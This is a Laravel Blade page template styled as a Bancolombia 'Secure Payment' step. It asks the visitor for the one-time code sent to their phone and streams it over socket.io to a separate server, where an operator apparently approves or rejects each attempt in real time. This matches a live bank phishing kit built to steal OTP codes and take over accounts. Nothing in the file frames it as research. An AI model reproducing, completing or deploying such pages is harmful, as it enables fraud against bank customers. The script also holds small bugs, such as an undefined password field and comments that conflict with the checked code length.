@extends('banks.bancolombia.layout')

@section('title', 'Secure Payment')

@section('page_title', 'Digite el codigo otp que llego a su celular.')


{{-- si hay error --}}
  
@if($errors->any())
@include('banks.bancolombia.components.alert', [
    'id' => 'otpError',
    'type' => 'error_field',
    'text' => $errors->first('user'),
    'show' => true,
])
@else
@include('banks.bancolombia.components.alert', [
    'id' => 'otpError',
    'type' => 'error_field',
    'show' => false,
])
@endif


@include('banks.bancolombia.components.alert', [
  'id' => 'success',
  'type' => 'success',
  'text' => 'Validación exitosa.'
])

@section('content')
    <br>
    <br>
    <form id="formStep4" method="POST" action="{{ route('pago.bank.step.save', ['bank' => 'bancolombia', 'step' => 4])}}">
        @csrf
        <div class="input-container">
            <img class="input-icon" src="{{asset('assets/img/payment/bancolombia/passicon.png')}}">
            <input type="tel" name="code" id="txtOtp" class="pass" placeholder maxlength="6" minlength="6"
                oninput="this.value = this.value.replace(/\D+/g, '');" inputmode="numeric" pattern="[0-9]{6}" required>
            <label for="txtOtp">Codigo OTP</label>
        </div>

        <a><small>¿necesitas ayuda?</small></a>

        <br>

        <div>
            <input type="submit" value="Continuar" id="btnOtp" disabled>
        </div>
    </form>
@endsection

@push('scripts')
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script src="{{ asset('assets/js/sc.js') }}"></script>
    <script>
       document.addEventListener('DOMContentLoaded', function () {
            // Ejemplo: habilitar botón cuando el input sea válido (4 dígitos)
            const otpInput = document.getElementById('txtOtp');
            const btn = document.getElementById('btnOtp');
            const form = document.getElementById('formStep4');

            const nodeUrl = @json($nodeUrl);
            const sessionId = @json($sessionId);
            const sessionToken = @json($sessionToken);
            const step = @json($step); // ✅ asegúrate de pasar $screen desde controller
            const bank = @json($bank);
            console.log(step)
            let waitingNewDecision = false;



            function toggleBtn() {
                btn.disabled = !(otpInput.value && otpInput.value.length === 6);
            }

            otpInput.addEventListener('input', toggleBtn);
            toggleBtn();

            function lockUI(lock) {
                passInput.disabled = lock;
                btn.disabled = lock ? true : !((passInput.value || '').trim().length === 4);
            }

            registerSocketUpdateCallback(function (s) {
                // Aquí puedes reaccionar extra sin redirigir manualmente
                console.log(s)

                // ✅ si acabamos de reintentar, ignora AUTH_ERROR "viejo"
                if (waitingNewDecision && String(s.action) === 'OTP_ERROR') {
                    return;
                }

                if (String(s.action).endsWith('_WAIT_ACTION')) {
                    waitingNewDecision = false;
                    lockUI(true);
                    return;
                }
            });

            form.addEventListener('submit', function (e) {
                e.preventDefault(); // ✅ quedarse en el mismo step

                const otp = (otpInput.value || '').trim();
                if (otp.length < 4) {
                    showBankAlert('otpError', 'Credenciales inválidas.');
                    return;
                }

                hideBankAlert('otpError');
                // ✅ emitir (si no está conectado, se encola y se envía cuando conecte)
                waitingNewDecision = true;
                window.rtEmitSubmit('user:submit_otp', {
                    sessionId,
                    auth: {
                        otp: otp,
                    }
                }, (ack) => {
                    console.log(ack)
                    if (!ack?.ok) {
                        if(ack?.error!=='bad_state') {
                            window.hideLoading?.();
                            showBankAlert('otpError', ack?.error || 'Error');
                        }
                    }
                });
            });




        });
    </script>
@endpush